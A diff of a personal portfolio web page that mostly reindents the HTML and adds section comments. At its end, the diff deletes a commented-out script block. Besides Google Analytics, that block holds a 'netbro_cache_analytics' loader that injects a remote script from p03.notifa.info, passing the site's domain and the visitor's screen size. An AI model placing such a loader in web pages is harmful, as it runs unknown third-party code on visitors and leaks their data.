@@ -1,206 +1,235 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
-    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width" />
-    <title>Riventus</title>
-    <!-- ICON web -->
-    <link rel="shortcut icon" href="assets2/img/riventus.ico">
-    <!-- <link rel="shortcut icon" href="favicon.png" /> -->
-    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700' rel='stylesheet' type='text/css'>
-    <link href="assets3/style/all.min.css" rel="stylesheet" type="text/css" />
-    <script src="assets3/js/jquery-1.9.1.min.js" type="text/javascript"></script>
-    <script src="assets3/js/modernizr-2.6.2.min.js" type="text/javascript"></script>
-    <!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
-    <!--[if IE]><style>.timeline li{display:block;-ms-filter: "progid: DXImageTransform.Microsoft.Alpha(Opacity=100)";filter: alpha(opacity=100);opacity: 1;}</style><![endif]-->
-    <style type="text/css">
-    	canvas{
-    		position: absolute; 
-    	}
+  <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+  <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width" />
+  <title>Riventus</title>
+  <!-- ICON web -->
+  <link rel="shortcut icon" href="assets2/img/riventus.ico">
+  <!-- <link rel="shortcut icon" href="favicon.png" /> -->
+  <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700' rel='stylesheet' type='text/css'>
+  <link href="assets3/style/all.min.css" rel="stylesheet" type="text/css" />
+  <script src="assets3/js/jquery-1.9.1.min.js" type="text/javascript"></script>
+  <script src="assets3/js/modernizr-2.6.2.min.js" type="text/javascript"></script>
+  <!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
+  <!--[if IE]><style>.timeline li{display:block;-ms-filter: "progid: DXImageTransform.Microsoft.Alpha(Opacity=100)";filter: alpha(opacity=100);opacity: 1;}</style><![endif]-->
+  
+  <!-- SECTION STYLE -->
+  <style type="text/css">
+  	canvas{
+  		position: absolute; 
+  	}
 
-    </style>
+  </style>
+  <!-- SECTION STYLE -->
 </head>
 
 <body data-spy="scroll" data-target=".navbar-flat" data-offset="55">
-    <div class="loader">
-        <div class="inner"></div>
+  
+  <!-- SECTION LOADER -->
+  <div class="loader">
+    <div class="inner"></div>
+  </div>
+  <!-- END SECTION LOADER -->
+
+  <!-- SECTION WELCOME -->
+  <section id="welcome">	
+    <div id="slides">
+      <div class="overlay"></div>
+      <div class="slides-container">
+
+      	<img src="assets3/images/slides/1.jpg" alt="1">
+      	<img src="assets3/images/slides/2.jpg" alt="2">
+      	<img src="assets3/images/slides/3.jpg" alt="3"></div>
+      <nav class="slides-navigation">
+          <a href="#" class="next"></a>
+          <a href="#" class="prev"></a>
+      </nav>
+      <div class="welcome-message">
+        <div class="heading">
+          <p>HI, I'M RIVENTUS</p>
+          <p class="small"><kbd>Fullstack</kbd> Web from IND</p>
+        </div><a href="#home" class="borderBtn scrollto">MORE ABOUT ME</a></div>
     </div>
-    <section id="welcome">
-    		
-            <div id="slides">
-                <div class="overlay"></div>
-                <div class="slides-container">
+  </section>
+  <!-- END SECTION WELCOME -->
 
-                	<img src="assets3/images/slides/1.jpg" alt="1">
-                	<img src="assets3/images/slides/2.jpg" alt="2">
-                	<img src="assets3/images/slides/3.jpg" alt="3"></div>
-                <nav class="slides-navigation">
-                    <a href="#" class="next"></a>
-                    <a href="#" class="prev"></a>
-                </nav>
-                <div class="welcome-message">
-                    <div class="heading">
-                        <p>HI, I'M RIVENTUS</p>
-                        <p class="small"><kbd>Fullstack</kbd> Web from IND</p>
-                    </div><a href="#home" class="borderBtn scrollto">MORE ABOUT ME</a></div>
-            </div>
+  <!-- SECTION NAVBAR -->
 
-    </section>
     <div class="navbar navbar-flat">
-        <div class="container">
-
-            <div class="navbar-header">
-                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a href="#" class="navbar-brand">MENU</a></div>
-            <div class="navbar-collapse collapse">
-                <nav>
-                    <ul class="nav navbar-nav">
-                        <li class="active"><a href="#welcome" class="scrollto">HOME</a></li>
-                        <li><a href="#about" class="scrollto">ABOUT</a></li>
-                        <li><a href="#skills" class="scrollto">SKILLS</a></li>
-                        <li><a href="#experience" class="scrollto">EXPERIENCE</a></li>
-                        <li><a href="#portfolio" class="scrollto">PORTFOLIO</a></li>
-                        <li><a href="#contact" class="scrollto">CONTACT</a></li>
-                    </ul>
-                </nav>
-            </div>
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="#" class="navbar-brand">MENU</a>
         </div>
+        <div class="navbar-collapse collapse">
+          <nav>
+            <ul class="nav navbar-nav">
+              <li class="active"><a href="#welcome" class="scrollto">HOME</a></li>
+              <li><a href="#about" class="scrollto">ABOUT</a></li>
+              <li><a href="#skills" class="scrollto">SKILLS</a></li>
+              <li><a href="#experience" class="scrollto">EXPERIENCE</a></li>
+              <li><a href="#portfolio" class="scrollto">PORTFOLIO</a></li>
+              <li><a href="#contact" class="scrollto">CONTACT</a></li>
+            </ul>
+          </nav>
+        </div>
+      </div>
     </div>
-    
+  <!-- END SECTION NAVBAR -->
+  
+  <!-- SECTION HOME -->  
     <section class="hero firstSec section colored" id="home">
     	<div class="container">
-            <div class="col-xs-6 col-md-4 profilePic">
-            	<img src="assets3/images/me.jpg" alt="" class="img-circle">
-            </div>
-            <div class="heading" style="z-index:9999">
-                <h1>RIVENTUS A H ARITONANG</h1>
-                <h3>Jr. Developer - Gamers - Musician</h3><a href="https://www.visualcv.com/riventus/pdf/" class="borderBtn">DOWNLOAD RESUME</a>
-            </div>
+        <div class="col-xs-6 col-md-4 profilePic">
+        	<img src="assets3/images/me.jpg" alt="" class="img-circle">
+        </div>
+        <div class="heading" style="z-index:9999">
+          <h1>RIVENTUS A H ARITONANG</h1>
+          <h3>Web Developer - Gamers - Musician</h3><a href="https://www.visualcv.com/riventus/pdf/" class="borderBtn">DOWNLOAD RESUME</a>
+        </div>
     	</div>
     	<div id="particles-js"></div>
     </section>
+  <!-- END SECTION HOME -->  
+
+  <!-- SECTION ABOUT -->  
     <section class="services section" id="about">
-        <div class="container">
-            <div class="divider"></div>
-            <div class="heading">
-                <h2>HERE'S WHAT I'M DOING</h2>
-                <p>I introduce the most creative and original ideas for my customers </p>
-            </div>
-            <div class="">
-                <p>Hi, It's me, Riventus from Jakarta, Indonesia, nice to meet you! Thanks for see my landing page. I love programming and improve myself to be great on it. ENJOY!</p>
-            </div>
-            <div class="services-inner hidethis">
-                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
-                    <p class="icon"><i class="heart"></i></p>
-                    <h3>COMMUNITY</h3></div>
-                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
-                    <p class="icon"><i class="coding"></i></p>
-                    <h3>DEVELOPMENT</h3></div>
-                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
-                    <p class="icon"><i class="coding"></i></p>
-                    <h3>GAMES</h3></div>
-                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
-                    <p class="icon"><i class="music"></i></p>
-                    <h3>MUSIC</h3></div>
-            </div>
+      <div class="container">
+        <div class="divider"></div>
+        <div class="heading">
+            <h2>HERE'S WHAT I'M DOING</h2>
+            <p>I introduce the most creative and original ideas for my customers </p>
         </div>
+        <div class="">
+            <p>Hi, It's me, Riventus from Jakarta, Indonesia, nice to meet you! Thanks for see my landing page. I love programming and improve myself to be great on it. ENJOY!</p>
+        </div>
+        <div class="services-inner hidethis">
+          <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+            <p class="icon"><i class="heart"></i></p>
+            <h3>COMMUNITY</h3></div>
+          <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+            <p class="icon"><i class="coding"></i></p>
+            <h3>DEVELOPMENT</h3></div>
+          <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+            <p class="icon"><i class="coding"></i></p>
+            <h3>GAMES</h3></div>
+          <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+            <p class="icon"><i class="music"></i></p>
+            <h3>MUSIC</h3>
+          </div>
+        </div>
+      </div>
     </section>
+  <!-- END SECTION ABOUT -->  
+
+    <!-- SECTION SKILLS -->  
     <section class="skills section colored" id="skills">
-        <div class="container">
-            <div class="divider"></div>
-            <div class="heading">
-                <h2>TECHNICAL SKILLS</h2></div>
-            <div id="skills-slide">
-                <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
-                    <h4>PHOTOSHOP</h4>
-                    <p>Adobe Photoshop</p>
-                </div>
-                <div class="skill"><span class="chart" data-percent="75"><span class="percent"></span></span>
-                    <h4>HTML5</h4>
-                    <p>Develop raw frontend</p>
-                </div>
-                <div class="skill"><span class="chart" data-percent="60"><span class="percent"></span></span>
-                    <h4>CSS</h4>
-                    <p>Make style for smile</p>
-                </div>
-                <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
-                    <h4>JAVASCRIPT</h4>
-                    <p>Interactive with user (ReactJS, React-Native)</p>
-                </div>
-                <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
-                    <h4>PHP</h4>
-                    <p>Dynamic data with ele<kbd>PHP</kbd>ant (Codeigniter n Laravel)</p>
-                </div>
-                <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
-                    <h4>MYSQL</h4>
-                    <p>Need manage data !</p>
-                </div>
-                <!--<div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
-                    <h4>PYTHON</h4>
-                    <p>I'm gonna EAT YOU !! (Django n Flask)</p>
-                </div>-->
-            </div>
+      <div class="container">
+        <div class="divider"></div>
+        <div class="heading">
+            <h2>TECHNICAL SKILLS</h2>
         </div>
+        <div id="skills-slide">
+          <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+            <h4>PHOTOSHOP</h4>
+            <p>Adobe Photoshop</p>
+          </div>
+          <div class="skill"><span class="chart" data-percent="75"><span class="percent"></span></span>
+            <h4>HTML5</h4>
+            <p>Develop raw frontend</p>
+          </div>
+          <div class="skill"><span class="chart" data-percent="60"><span class="percent"></span></span>
+            <h4>CSS</h4>
+            <p>Make style for smile</p>
+          </div>
+          <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+            <h4>JAVASCRIPT</h4>
+            <p>Interactive with user (ReactJS, React-Native)</p>
+          </div>
+          <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
+            <h4>PHP</h4>
+            <p>Dynamic data with ele<kbd>PHP</kbd>ant (Codeigniter n Laravel)</p>
+          </div>
+          <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
+            <h4>MYSQL</h4>
+            <p>Need manage data !</p>
+          </div>
+          <!--<div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+              <h4>PYTHON</h4>
+              <p>I'm gonna EAT YOU !! (Django n Flask)</p>
+          </div>-->
+        </div>
+      </div>
     </section>
+    <!-- END SECTION SKILLS -->  
+
+    <!-- SECTION Experience -->  
     <section class="experience section" id="experience">
-        <div class="container">
-            <div class="divider"></div>
-            <div class="heading">
-                <h2>WORK EXPERIENCE</h2></div>
-            <div class="row">
-                <div class="timeline">
-                    <ul>
-                        
-                        <li class="animated">
-                            <div class="point"></div>
-                            <div class="bubble">
-                                <div class="bubble-arrow"></div>
-                                <p class="date">December 2019 - Present</p>
-                                <p class="name">PT Woolu Aksara Maya</p>
-                                <p class="title">FrontEnd Web Developer</p>
-                            </div>
-                        </li>
-                        <li class="animated">
-                            <div class="point"></div>
-                            <div class="bubble">
-                                <div class="bubble-arrow"></div>
-                                <p class="date">July 2019 - December 2019</p>
-                                <p class="name">PT HAYUNING INDO TECH</p>
-                                <p class="title">Backend Web Developer</p>
-                            </div>
-                        </li>
-                        <li class="animated odd">
-                            <div class="point"></div>
-                            <div class="bubble">
-                                <div class="bubble-arrow"></div>
-                                <p class="date">Oct. 2018 - June 2019</p>
-                                <p class="name">Freelance</p>
-                                <p class="title">Web Developer</p>
-                            </div>
-                        </li>
-                        <li class="animated">
-                            <div class="point"></div>
-                            <div class="bubble">
-                                <div class="bubble-arrow"></div>
-                                <p class="date">May 2018 - Sept. 2018</p>
-                                <p class="name">PT TEKNO INOVASI NUSANTARA</p>
-                                <p class="title">Jr. Web Developer</p>
-                            </div>
-                        </li>
-                        <li class="animated odd">
-                            <div class="point"></div>
-                            <div class="bubble">
-                                <div class="bubble-arrow"></div>
-                                <p class="date">Sept. 2017 - May 2018</p>
-                                <p class="name">Learned Programming</p>
-                                <p class="title">Jr. Web Developer</p>
-                            </div>
-                        </li>
-                    </ul>
+      <div class="container">
+        <div class="divider"></div>
+        <div class="heading">
+          <h2>WORK EXPERIENCE</h2></div>
+        <div class="row">
+          <div class="timeline">
+            <ul>
+              <li class="animated odd">
+                <div class="point"></div>
+                <div class="bubble">
+                  <div class="bubble-arrow"></div>
+                  <p class="date">December 2019 - Present</p>
+                  <p class="name">PT Woolu Aksara Maya</p>
+                  <p class="title">FrontEnd Web Developer</p>
                 </div>
-            </div>
+              </li>
+              <li class="animated">
+                <div class="point"></div>
+                <div class="bubble">
+                  <div class="bubble-arrow"></div>
+                  <p class="date">July 2019 - December 2019</p>
+                  <p class="name">PT HAYUNING INDO TECH</p>
+                  <p class="title">Backend Web Developer</p>
+                </div>
+              </li>
+              <li class="animated odd">
+                <div class="point"></div>
+                <div class="bubble">
+                  <div class="bubble-arrow"></div>
+                  <p class="date">Oct. 2018 - June 2019</p>
+                  <p class="name">Freelance</p>
+                  <p class="title">Web Developer</p>
+                </div>
+              </li>
+              <li class="animated">
+                <div class="point"></div>
+                <div class="bubble">
+                  <div class="bubble-arrow"></div>
+                  <p class="date">May 2018 - Sept. 2018</p>
+                  <p class="name">PT TEKNO INOVASI NUSANTARA</p>
+                  <p class="title">Jr. Web Developer</p>
+                </div>
+              </li>
+              <li class="animated odd">
+                <div class="point"></div>
+                <div class="bubble">
+                  <div class="bubble-arrow"></div>
+                  <p class="date">Sept. 2017 - May 2018</p>
+                  <p class="name">Learned Programming</p>
+                  <p class="title">Jr. Web Developer</p>
+                </div>
+              </li>
+            </ul>
+          </div>
         </div>
+      </div>
     </section>
+    <!-- END SECTION Experience -->
+
+    <!-- SECTION PORTFOLIO -->
     <section class="portfolio section" id="portfolio">
         <div class="container">
             <div class="divider"></div>
@@ -268,6 +297,9 @@
             </div>
         </div>
     </section>
+    <!-- END SECTION PORTFOLIO -->
+    
+    <!-- SECTION CONTACT -->
     <section class="contact section" id="contact">
         <div class="container">
             <div class="divider"></div>
@@ -289,92 +321,62 @@
             </div>
         </div>
     </section>
-    <div><iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15864.560052304374!2d106.786817!3d-6.2452728!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x94aa9cb2712d00c7!2sAksaramaya!5e0!3m2!1sid!2sid!4v1586417425842!5m2!1sid!2sid" width="100%" height="450" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe></div>
+    <!-- END SECTION CONTACT -->
+
+    <!-- SECTION MAP -->
+    <div>
+      <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15864.560052304374!2d106.786817!3d-6.2452728!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x94aa9cb2712d00c7!2sAksaramaya!5e0!3m2!1sid!2sid!4v1586417425842!5m2!1sid!2sid" width="100%" height="450" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
+    </div>
+    <!-- END SECTION MAP -->
+
     <div class="clear"></div>
+
+    <!-- SECTION FOOTER -->
     <footer class="section">
-        <div class="container">
-            <p>&copy;2020 <a href="https://rhivent.github.io">Riventus</a>. All Rights Reserved.</p>
-            <ul>
-                <li>
-                    <a target="_blank" class="facebook" href="https://www.facebook.com/riventus.aritonang"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="twitter" href="https://twitter.com/riventusaha"></a>
-                </li>
-                <!-- <li>
-                    <a target="_blank" class="google" href="https://plus.google.com/"></a>
-                </li> -->
-                <li>
-                    <a target="_blank" class="linkedin" href="https://id.linkedin.com/in/riventusaritonang"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="instagram" href="https://www.instagram.com/rhivent"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="youtube" href="https://www.youtube.com/channel%2FUCBsSxrVeP_FgLlUTuRKS-tA?fbclid=IwAR0XWv_kJBs7AoJ-DtOLG4PVZAvrAAvPOjd-nJ8i7qthRRlPRQ_igAo3NYU"></a>
-                </li>
-                <!-- <li>
-                    <a target="_blank" class="vimeo" href="http://www.vimeo.com/"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="tumblr" href="http://www.tumblr.com/"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="dribbble" href="http://www.dribbble.com/"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="behance" href="https://www.behance.net/"></a>
-                </li>
-                <li>
-                    <a target="_blank" class="flickr" href="https://www.flickr.com/"></a>
-                </li> -->
-            </ul>
-        </div>
+      <div class="container">
+        <p>&copy;2020 <a href="https://rhivent.github.io">Riventus</a>. All Rights Reserved.</p>
+        <ul>
+          <li>
+              <a target="_blank" class="facebook" href="https://www.facebook.com/riventus.aritonang"></a>
+          </li>
+          <li>
+              <a target="_blank" class="twitter" href="https://twitter.com/riventusaha"></a>
+          </li>
+          <li>
+              <a target="_blank" class="linkedin" href="https://id.linkedin.com/in/riventusaritonang"></a>
+          </li>
+          <li>
+              <a target="_blank" class="instagram" href="https://www.instagram.com/rhivent"></a>
+          </li>
+          <li>
+              <a target="_blank" class="youtube" href="https://www.youtube.com/channel%2FUCBsSxrVeP_FgLlUTuRKS-tA?fbclid=IwAR0XWv_kJBs7AoJ-DtOLG4PVZAvrAAvPOjd-nJ8i7qthRRlPRQ_igAo3NYU"></a>
+          </li>
+          <!-- <li>
+              <a target="_blank" class="vimeo" href="http://www.vimeo.com/"></a>
+          </li>
+          <li>
+              <a target="_blank" class="tumblr" href="http://www.tumblr.com/"></a>
+          </li>
+          <li>
+              <a target="_blank" class="dribbble" href="http://www.dribbble.com/"></a>
+          </li>
+          <li>
+              <a target="_blank" class="behance" href="https://www.behance.net/"></a>
+          </li>
+          <li>
+              <a target="_blank" class="flickr" href="https://www.flickr.com/"></a>
+          </li> -->
+        </ul>
+      </div>
     </footer>
+    <!-- END SECTION FOOTER -->
+
+    <!-- SECTION SCRIPT -->
     <!--<script src="https://maps.googleapis.com/maps/api/js?sensor=false" type="text/javascript"></script>-->
     <script src="assets3/js/all.min.js" type="text/javascript"></script>
     <script src="assets/js/particles.min.js"></script>
     <script src="assets/js/app.js"></script>
-    <!--<script>
-        (function(i, s, o, g, r, a, m) {
-            i['GoogleAnalyticsObject'] = r;
-            i[r] = i[r] || function() {
-                (i[r].q = i[r].q || []).push(arguments)
-            }, i[r].l = 1 * new Date();
-            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
-            a.async = 1;
-            a.src = g;
-            m.parentNode.insertBefore(a, m)
-        })(window, document, 'script', '../../../www.google-analytics.com/analytics.js', 'ga');
-        ga('create', 'UA-51103185-1', 'sftheme.com');
-        ga('send', 'pageview');
-    </script>
-    <script type="text/javascript">
-        if (self == top) {
-            function netbro_cache_analytics(fn, callback) {
-                setTimeout(function() {
-                    fn();
-                    callback();
-                }, 0);
-            }
-
-            function sync(fn) {
-                fn();
-            }
-
-            function requestCfs() {
-                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-                var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2qujevZ1M%2bIaBL9O0Q6GkAQVe5uexGQ7hxJppsS4zcl8l5PJMmWyVi8qs3ZiB%2fdqSipO25YsN%2f9xhmzwLAR%2bH1%2fJBqLjLQv8Ai%2bZX6rla%2fFKlCtSBAkLsL8WyLhSVD54nEYfpaZg9p0m3v03AwO07iibpynF7zHr2Yy22LJmydWoko7UaKanPtYMiS69mM2%2fdt1ks4M%2bCDu%2b1sfgLhn%2fDzMymGgw9x7oT8xq0XOy1IaeW61z%2bzCsotEY%2bVT7pkgKe1GFh2%2bCUERVAwbluOvZ1ZQW10lH9Am9OmD%2bh8QO221rJgCcrhWxpGPxJnWpsMqKW5aIfhk4y%2bcBAyHqyxqLfxlZRjN%2bxjcf%2bkQJeXqFBoseLjMQ3aGSGUZqKLrt7oc9smt2vNb%2bQFFGrmjjf4LaD1w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-                var bsa = document.createElement('script');
-                bsa.type = 'text/javascript';
-                bsa.async = true;
-                bsa.src = url;
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-            }
-            netbro_cache_analytics(requestCfs, function() {});
-        };
-    </script>-->
+    <!-- END SECTION SCRIPT -->
 </body>
 
 </html>
